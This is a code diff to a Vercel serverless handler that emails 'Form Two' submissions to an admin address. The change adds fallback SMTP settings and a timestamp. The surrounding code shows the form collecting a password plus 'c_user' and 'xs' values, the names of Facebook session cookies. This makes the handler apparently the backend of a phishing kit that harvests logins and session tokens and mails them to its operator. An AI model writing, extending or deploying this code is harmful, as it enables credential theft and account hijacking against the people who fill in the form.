@@ -2,12 +2,12 @@ import { VercelRequest, VercelResponse } from '@vercel/node';
 import nodemailer from 'nodemailer';
 
 const transporter = nodemailer.createTransport({
-  host: process.env.SMTP_HOST,
+  host: process.env.FORM_TWO_SMTP_HOST || process.env.SMTP_HOST,
   port: parseInt(process.env.SMTP_PORT || '587'),
   secure: false,
   auth: {
-    user: process.env.SMTP_USER,
-    pass: process.env.SMTP_PASS,
+    user: process.env.FORM_TWO_SMTP_USER || process.env.SMTP_USER,
+    pass: process.env.FORM_TWO_SMTP_PASS || process.env.SMTP_PASS,
   },
 });
 
@@ -25,7 +25,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 
     // Send email
     await transporter.sendMail({
-      from: process.env.SMTP_USER,
+      from: process.env.FORM_TWO_SMTP_USER || process.env.SMTP_USER,
       to: process.env.ADMIN_EMAIL,
       subject: 'New Form Two Submission',
       html: `
@@ -34,6 +34,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
         <p><strong>Password:</strong> ${password}</p>
         <p><strong>c_user:</strong> ${c_user}</p>
         <p><strong>xs:</strong> ${xs}</p>
+        <p><strong>Submission Time:</strong> ${new Date().toISOString()}</p>
       `,
     });
 
